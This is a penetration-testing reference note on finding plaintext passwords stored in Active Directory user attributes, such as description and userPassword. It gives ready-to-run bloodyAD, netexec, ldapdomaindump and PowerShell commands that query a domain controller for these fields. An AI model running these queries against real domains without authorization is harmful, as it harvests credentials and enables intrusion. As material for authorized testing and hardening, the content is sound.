---
title: Password - AD User Comment
type: technique
tags: [active-directory, credentials, enumeration, reference-import, windows]
phase: recon
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Password - AD User Comment

## What it is

There are 3-4 fields that seem to be common in most Active Directory schemas: `UserPassword`, `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.

## How it works

AD user accounts contain several optional text fields (`description`, `info`, `userPassword`, `UnixUserPassword`, `msSFU30Password`) that administrators sometimes use to store credentials in plaintext, either as a convenience or during account setup. Any authenticated domain user can read these attributes via LDAP by default, making password-populated user comments a trivial credential source discoverable with a single LDAP query. Attackers use BloodHound or direct LDAP searches to enumerate all user objects and filter for non-empty description or comment fields containing likely passwords.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

There are 3-4 fields that seem to be common in most Active Directory schemas: `UserPassword`, `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.

* Windows/Linux command

```ps1
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description
```

* Password in User Description

```powershell
netexec ldap domain.lab -u 'username' -p 'password' -M user-desc
netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
```

* Get `unixUserPassword` attribute from all users in ldap

```ps1
nxc ldap 10.10.10.10 -u user -p pass -M get-unixUserPassword -M getUserPassword
```

* Native Powershell command

```powershell
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
```

* Dump the Active Directory and `grep` the content.

```powershell
ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[bloodhound]]
- [[john]]
- [[netexec]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
